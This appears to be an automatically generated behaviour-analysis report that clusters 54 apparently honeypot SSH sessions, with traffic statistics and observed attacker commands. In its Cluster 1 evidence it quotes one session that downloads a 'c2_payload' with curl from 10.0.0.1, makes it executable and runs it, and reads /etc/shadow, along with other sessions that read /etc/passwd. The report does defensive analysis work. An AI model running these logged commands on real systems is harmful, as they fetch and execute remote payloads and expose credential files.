# Behaviour Pattern Analysis Report

- Total DEC sessions analysed: 54
- Valid cluster assignments: 54
- Missing/invalid cluster assignments: 0
- Duplicate DEC session IDs: 0
- Unmatched DEC-to-mapping sessions: 0
- Sessions without session-details record: 0

## Cluster distribution

| Cluster ID | Session Count | Percentage |
|---|---:|---:|
| 0.0 | 1 | 1.85% |
| 1.0 | 7 | 12.96% |
| 2.0 | 46 | 85.19% |

## Cluster characteristics

### Cluster 0
- Session count: 1
- Percentage of sessions: 1.85%
- Dominant behavioural interpretation: Command execution
- Key distinguishing features: dload=3959.739; rate=505.249; dbytes=337.000; sload=82.250; dur=0.681
- Top command categories: file_system (1)

### Cluster 1
- Session count: 7
- Percentage of sessions: 12.96%
- Dominant behavioural interpretation: Mixed/Unclassified
- Key distinguishing features: dbytes=1631.857; dload=1014.589; rate=131.044; sbytes=64.286; sload=33.766
- Top command categories: reconnaissance (31); file_system (16); privilege_escalation (9); credential_attack (5); file_transfer (4)

### Cluster 2
- Session count: 46
- Percentage of sessions: 85.19%
- Dominant behavioural interpretation: Credential-attack behaviour
- Key distinguishing features: dbytes=0.000; dload=0.000; rate=0.000; sbytes=0.000; sload=0.000
- Top command categories: No command category evidence

## Command and activity evidence

### Cluster 0

### Cluster 1

## Evidence-backed behavioural interpretation

### Cluster 0
- Most common interpretation: Command execution (1 sessions)
- Session 4f8484ce537b: Command execution — Observed commands: cd /tmp; Command categories: file_system; Authentication success flag: 1; Session duration: 0.680853

### Cluster 1
- Most common interpretation: Mixed/Unclassified (5 sessions)
- Session 88cbfb56c025: Mixed/Unclassified — Observed commands: cat /etc/passwd, exit, ls -la, pwd, uname -a; Command categories: credential_attack, file_system, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 11.224239
- Session a4c62363d8d6: Download or payload retrieval — Observed commands: ./payload &, cat /etc/shadow, chmod +x payload, curl http://10.0.0.1/c2_payload > payload, exit; Command categories: file_system, file_transfer, networking, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 21.458934
- Session 1f53fe8bd0ff: Mixed/Unclassified — Observed commands: cat /etc/passwd, exit, ls -la, pwd, uname -a; Command categories: credential_attack, file_system, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 10.762586

### Cluster 2
- Most common interpretation: Credential-attack behaviour (46 sessions)
- Session f462237bf38f: Credential-attack behaviour — Authentication success flag: 0; Session duration: 3.052236
- Session d71473f8df1f: Credential-attack behaviour — Authentication success flag: 0; Session duration: 5.033859
- Session ac3d855b1968: Credential-attack behaviour — Authentication success flag: 0; Session duration: 1.024292

## Ambiguities and limitations

- Cluster IDs are mathematical group labels, not attack labels.
- Interpretation is limited to fields present in the repository data and to the evidence available in session metadata.
- If a cluster lacks reliable command or auth evidence, it is reported as Mixed/Unclassified or Insufficient Evidence.
- Some session records may be absent from session_details.json or mapping files; these are tracked explicitly in validation output.

